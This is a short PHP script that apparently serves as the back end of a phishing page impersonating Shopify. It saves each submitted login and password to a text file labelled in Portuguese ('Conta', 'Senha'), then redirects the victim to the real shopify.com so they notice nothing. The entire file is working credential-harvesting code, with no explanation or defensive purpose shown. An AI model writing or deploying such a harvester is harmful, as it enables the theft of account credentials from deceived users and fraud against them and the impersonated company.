<?php

file_put_contents("usernames.txt", "Conta: " . $_POST['login'] . " Senha: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://shopify.com');
exit();
